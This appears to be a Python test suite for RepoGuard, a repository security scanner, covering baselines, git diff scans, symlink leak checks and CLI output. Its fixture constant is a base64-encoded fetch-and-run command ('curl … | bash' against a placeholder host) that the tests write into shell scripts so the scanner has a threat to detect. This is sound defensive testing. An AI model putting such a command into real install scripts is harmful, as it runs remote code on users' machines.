import base64
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

from repoguard.baseline import Baseline, apply_baseline
from repoguard.gitdiff import diff_paths
from repoguard.reporters import render_report
from repoguard.scanner import RepoScanner
from tests.fixture_builder import suspicious_fixture


ROOT = Path(__file__).resolve().parent.parent
CANARY = "DIFF_SECRET_CANARY_67c1"
HOSTILE_TEMPLATE = "Y3VybCBodHRwczovL2V4YW1wbGUuaW52YWxpZC97bWFya2VyfSB8IGJhc2gK"


def run_cli_at(cwd: Path, *arguments: str) -> subprocess.CompletedProcess:
    environment = os.environ.copy()
    environment["PYTHONPATH"] = str(ROOT / "src")
    return subprocess.run(
        [sys.executable, "-m", "repoguard"] + list(arguments),
        cwd=str(cwd),
        env=environment,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )


def write_hostile(path: Path, marker: str = "payload") -> None:
    content = base64.b64decode(HOSTILE_TEMPLATE).decode("utf-8").format(marker=marker)
    path.write_text(content, encoding="utf-8")


def git(root: Path, *arguments: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["git"] + list(arguments),
        cwd=str(root),
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )


def initialize_git(root: Path) -> None:
    git(root, "init", "-q")
    git(root, "config", "user.name", "RepoGuard Tests")
    git(root, "config", "user.email", "tests@example.invalid")


def commit_all(root: Path, message: str = "fixture") -> None:
    git(root, "add", ".")
    git(root, "commit", "-q", "-m", message)


class BaselineTests(unittest.TestCase):
    def test_baseline_suppresses_finding_in_all_outputs(self) -> None:
        with suspicious_fixture() as fixture:
            report = RepoScanner().scan(fixture)
            selected = report.findings[0]
            matching_count = sum(
                finding.fingerprint == selected.fingerprint for finding in report.findings
            )
            baseline = Baseline(
                fingerprints={
                    selected.fingerprint: {
                        "rule_id": selected.rule_id,
                        "path": selected.path,
                        "first_seen": "2026-01-01T00:00:00Z",
                    }
                }
            )
            original_count = len(report.findings)
            apply_baseline(report, baseline)

            self.assertEqual(report.new_findings, original_count - matching_count)
            self.assertEqual(report.baselined_findings, matching_count)
            text_output = render_report(report, "text")
            self.assertIn("New findings: {0}".format(report.new_findings), text_output)
            self.assertIn("Baselined findings: {0}".format(matching_count), text_output)
            self.assertNotIn("[baselined]", text_output)
            shown = render_report(report, "text", show_baselined=True)
            self.assertIn("[baselined]", shown)

            json_output = json.loads(render_report(report, "json"))
            self.assertEqual(json_output["new_findings"], report.new_findings)
            self.assertEqual(json_output["baselined_findings"], matching_count)
            self.assertEqual(len(json_output["findings"]), report.new_findings)

            sarif = json.loads(render_report(report, "sarif"))
            properties = sarif["runs"][0]["properties"]
            self.assertEqual(properties["new_findings"], report.new_findings)
            self.assertEqual(properties["baselined_findings"], matching_count)
            self.assertEqual(len(sarif["runs"][0]["results"]), report.new_findings)

    def test_fingerprint_is_line_independent_but_match_sensitive(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            path = root / "install.sh"
            write_hostile(path, "first")
            first = RepoScanner().scan(root).findings[0]

            path.write_text("# heading\n# another line\n" + path.read_text(encoding="utf-8"), encoding="utf-8")
            shifted = RepoScanner().scan(root).findings[0]
            self.assertNotEqual(first.line, shifted.line)
            self.assertEqual(first.fingerprint, shifted.fingerprint)

            write_hostile(path, "changed")
            changed = RepoScanner().scan(root).findings[0]
            self.assertNotEqual(first.fingerprint, changed.fingerprint)

    def test_repository_baseline_is_ignored_without_explicit_flag(self) -> None:
        with suspicious_fixture() as fixture:
            findings = RepoScanner().scan(fixture).findings
            before_result = run_cli_at(ROOT, "scan", str(fixture), "--format", "json")
            self.assertEqual(before_result.returncode, 0, before_result.stderr)
            before = json.loads(before_result.stdout)
            payload = {
                "baseline_version": 1,
                "tool_version": "0.2.0",
                "generated_at": "2026-01-01T00:00:00Z",
                "fingerprints": {
                    finding.fingerprint: {
                        "rule_id": finding.rule_id,
                        "path": finding.path,
                        "first_seen": "2026-01-01T00:00:00Z",
                    }
                    for finding in findings
                },
            }
            (fixture / ".repoguard-baseline.json").write_text(
                json.dumps(payload), encoding="utf-8"
            )
            after_result = run_cli_at(ROOT, "scan", str(fixture), "--format", "json")
            self.assertEqual(after_result.returncode, 0, after_result.stderr)
            after = json.loads(after_result.stdout)
            self.assertEqual(before["findings"], after["findings"])
            self.assertEqual(after["baselined_findings"], 0)

    def test_malformed_and_unknown_baselines_are_operational_errors(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            (root / "safe.txt").write_text("safe", encoding="utf-8")
            malformed = root / "malformed.json"
            malformed.write_text("{", encoding="utf-8")
            unknown = root / "unknown.json"
            unknown.write_text(
                json.dumps({"baseline_version": 99, "fingerprints": {}}), encoding="utf-8"
            )
            for baseline, expected in (
                (malformed, "Malformed baseline JSON"),
                (unknown, "Unsupported baseline_version"),
            ):
                with self.subTest(baseline=baseline.name):
                    result = run_cli_at(ROOT, "scan", str(root), "--baseline", str(baseline))
                    self.assertEqual(result.returncode, 1)
                    self.assertIn(expected, result.stderr)

    def test_update_baseline_round_trip_and_truncation_refusal(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            base = Path(temporary_directory)
            baseline_path = base / "accepted.json"
            refused_path = base / "refused.json"
            with suspicious_fixture() as fixture:
                update = run_cli_at(
                    ROOT,
                    "scan",
                    str(fixture),
                    "--baseline",
                    str(baseline_path),
                    "--update-baseline",
                    "--format",
                    "json",
                )
                self.assertEqual(update.returncode, 0, update.stderr)
                baseline_payload = json.loads(baseline_path.read_text(encoding="utf-8"))
                self.assertEqual(baseline_payload["baseline_version"], 1)
                self.assertEqual(baseline_payload["tool_version"], "0.3.1")
                self.assertTrue(baseline_payload["fingerprints"])

                accepted = run_cli_at(
                    ROOT,
                    "scan",
                    str(fixture),
                    "--baseline",
                    str(baseline_path),
                    "--fail-on",
                    "low",
                    "--format",
                    "json",
                )
                self.assertEqual(accepted.returncode, 0, accepted.stderr)
                accepted_payload = json.loads(accepted.stdout)
                self.assertEqual(accepted_payload["verdict"], "OK")
                self.assertEqual(accepted_payload["new_findings"], 0)
                self.assertGreater(accepted_payload["baselined_findings"], 0)

                refused = run_cli_at(
                    ROOT,
                    "scan",
                    str(fixture),
                    "--baseline",
                    str(refused_path),
                    "--update-baseline",
                    "--max-files",
                    "0",
                )
                self.assertEqual(refused.returncode, 3)
                self.assertIn("refusing to update", refused.stderr)
                self.assertFalse(refused_path.exists())


class DiffTests(unittest.TestCase):
    def test_diff_scans_only_changed_and_untracked_files(self) -> None:
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            initialize_git(root)
            write_hostile(root / "unchanged.sh", "unchanged")
            (root / "changed.sh").write_text("safe\n", encoding="utf-8")
            commit_all(root)
            write_hostile(root / "changed.sh", "changed")
            write_hostile(root / "untracked.sh", "untracked")

            result = run_cli_at(
                ROOT,
                "scan",
                str(root),
                "--diff",
                "HEAD",
                "--format",
                "json",
                "--fail-on",
                "high",
            )
            self.assertEqual(result.returncode, 2, result.stderr)
            payload = json.loads(result.stdout)
            self.assertEqual(payload["scan_mode"], "diff")
            self.assertEqual(payload["diff_base"], "HEAD")
            self.assertEqual(payload["scanned_files"], 2)
            finding_paths = {finding["path"] for finding in payload["findings"]}
            self.assertIn("changed.sh", finding_paths)
            self.assertIn("untracked.sh", finding_paths)
            self.assertNotIn("unchanged.sh", finding_paths)

    def test_diff_url_and_bad_ref_fail_without_fallback(self) -> None:
        remote = run_cli_at(
            ROOT,
            "scan",
            "https://github.com/mpg-one/RepoGuard",
            "--diff",
            "HEAD",
        )
        self.assertEqual(remote.returncode, 1)
        self.assertIn("local Git targets only", remote.stderr)

        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            initialize_git(root)
            write_hostile(root / "tracked.sh", "tracked")
            commit_all(root)
            invalid = run_cli_at(ROOT, "scan", str(root), "--diff", "missing-ref")
            self.assertEqual(invalid.returncode, 1)
            self.assertIn("Could not calculate diff", invalid.stderr)
            self.assertEqual(invalid.stdout, "")

    def test_diff_symlink_does_not_leak_outside_canary(self) -> None:
        if os.name == "nt":
            self.skipTest("symlink creation is not reliably available on Windows")
        with tempfile.TemporaryDirectory() as temporary_directory:
            base = Path(temporary_directory)
            root = base / "repo"
            root.mkdir()
            initialize_git(root)
            (root / "safe.txt").write_text("safe", encoding="utf-8")
            commit_all(root)
            outside = base / "outside.txt"
            outside.write_text(CANARY, encoding="utf-8")
            (root / "leak.txt").symlink_to(outside)

            selected = diff_paths(root, "HEAD")
            self.assertIn("leak.txt", selected)
            report = RepoScanner(evidence_mode="snippet").scan(
                root,
                selected_paths=selected,
                scan_mode="diff",
                diff_base="HEAD",
            )
            self.assertGreaterEqual(report.skipped_files, 1)
            for output_format in ("text", "json", "sarif"):
                self.assertNotIn(CANARY, render_report(report, output_format))
            self.assertFalse(any(finding.path == "leak.txt" for finding in report.findings))


class CliAndIdentityTests(unittest.TestCase):
    def test_no_argument_scan_and_scan_subcommand_use_cwd(self) -> None:
        clean = ROOT / "tests" / "fixtures" / "clean-repo"
        for arguments in ((), ("scan",)):
            with self.subTest(arguments=arguments):
                result = run_cli_at(clean, *arguments)
                self.assertEqual(result.returncode, 0, result.stderr)
                self.assertIn("Verdict: OK", result.stdout)
                self.assertIn("Risk: Clean", result.stdout)

        shorthand = run_cli_at(ROOT, str(clean), "--format", "json")
        self.assertEqual(shorthand.returncode, 0, shorthand.stderr)
        self.assertEqual(json.loads(shorthand.stdout)["verdict"], "OK")

    def test_quiet_is_one_line_for_ok_blocked_and_incomplete(self) -> None:
        clean = ROOT / "tests" / "fixtures" / "clean-repo"
        ok = run_cli_at(clean, "--quiet")
        self.assertEqual(ok.returncode, 0)
        self.assertEqual(len(ok.stdout.splitlines()), 1)
        self.assertTrue(ok.stdout.startswith("RepoGuard: OK — clean risk,"))

        with suspicious_fixture() as fixture:
            blocked = run_cli_at(
                ROOT, "scan", str(fixture), "--quiet", "--fail-on", "high"
            )
            self.assertEqual(blocked.returncode, 2)
            self.assertEqual(len(blocked.stdout.splitlines()), 1)
            self.assertTrue(blocked.stdout.startswith("RepoGuard: DO_NOT_PROCEED — critical risk,"))

            incomplete = run_cli_at(
                ROOT, "scan", str(fixture), "--quiet", "--max-files", "0"
            )
            self.assertEqual(incomplete.returncode, 3)
            self.assertEqual(
                incomplete.stdout.strip(),
                "RepoGuard: INCOMPLETE (max_files limit) — scan truncated, results unreliable.",
            )

        machine = run_cli_at(clean, "--quiet", "--format", "json")
        self.assertEqual(machine.returncode, 0)
        self.assertEqual(json.loads(machine.stdout)["verdict"], "OK")

    def test_finding_counts_are_identical_across_evidence_modes(self) -> None:
        with suspicious_fixture() as fixture:
            counts = {
                mode: len(RepoScanner(evidence_mode=mode).scan(fixture).findings)
                for mode in ("safe", "none", "snippet")
            }
        self.assertEqual(len(set(counts.values())), 1, counts)


if __name__ == "__main__":
    unittest.main()
